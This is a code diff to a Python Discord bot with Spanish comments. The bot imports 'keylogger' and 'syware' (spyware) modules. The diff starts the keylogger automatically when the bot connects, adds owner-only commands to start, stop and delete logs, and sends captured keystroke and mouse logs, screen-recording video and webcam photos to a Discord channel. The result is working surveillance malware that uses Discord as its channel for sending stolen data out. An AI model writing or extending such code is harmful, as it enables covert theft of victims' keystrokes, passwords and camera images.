@@ -5,8 +5,7 @@ from discord.ext import commands
 import os
 import dotenv
 import keylogger as key 
-import syware as video   
-import asyncio
+import syware as video
 
 #discord
 env = dotenv.find_dotenv('Tokkens.env')
@@ -25,14 +24,39 @@ key_logger = key.Keylog()
 async def on_ready():
     print(f'Bot {bot.user.name} conectado!')
     await bot.change_presence(activity=discord.Game(name="Escribe !ayuda"))
+    key_logger.listen_thread()
 
-
+@bot.command()
+@commands.is_owner()
+async def stoplogs(ctx):
+    await ctx.send("Deteniendo logger")
+    key_logger.stop_thread()
+    
+@bot.command()
+@commands.is_owner()
+async def startlogs(ctx):
+    await ctx.send("Iniciando logs")
+    key_logger.listen_thread()
+    
+@bot.command()
+@commands.is_owner()
+async def deletelogs(ctx):
+    "se necesitan permisos de admin"
+    await ctx.send("Borrando logs antiguos")
+    if os.path.exists(key_logger.keyslog):
+        os.remove(key_logger.keyslog)
+    if os.path.exists(key_logger.mouselog):
+        os.remove(key_logger.mouselog)
+    else:
+        await ctx.send("Archivos no existentes")
+        
 @bot.command()
 @commands.is_owner()
 async def logs(ctx):
     "se necesitan permisos de admin"
     try:
         await ctx.send(file=discord.File(key_logger.keyslog))
+        await ctx.send(file=discord.File(key_logger.mouselog))
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
@@ -56,7 +80,7 @@ async def record(ctx):
         await ctx.send("Grabando video")
         recorder = video.videotake()
         recorder.checkpath()
-        recorder.takensavev()
+        recorder.start_video_thread()
         await ctx.send(file=discord.File(f"takensend/video/Video {recorder.datetime}.avi"))
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
@@ -64,15 +88,30 @@ async def record(ctx):
 @bot.command()
 @commands.is_owner()
 async def webcam(ctx):
-    "se necesitan permisos del admin "
+    "se necesitan permisos del admin"
     try:
         await ctx.send("Tomando captura de camara")
         cam = video.camtake()
         cam.checkpath()
         cam.takecamphoto()
-        await ctx.send(file=discord.File(f"takensend/image/Camara {cam.datetime}.jpg"))
+        
+        if os.path.exists(f"takensend/image/Camara {cam.datetime}.jpg"):
+            await ctx.send(file=discord.File(f"takensend/image/Camara {cam.datetime}.jpg"))
+        elif os.path.exists(f"takensend/image/Camara2 {cam.datetime}.jpg"):
+            await ctx.send(file=discord.File(f"takensend/image/Camara2 {cam.datetime}.jpg"))
+        else:
+            await ctx.send("Que verga paso")
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+@commands.is_owner()
+async def die(ctx):
+    "se necesitan permisos de admin"
+    key_logger.stop_thread()
+    await ctx.send("https://tenor.com/cAWHmLGZsdT.gif")
+    await ctx.send("Goodbye!")
+    exit(1)
 
 @bot.event
 async def on_command_error(ctx, error):
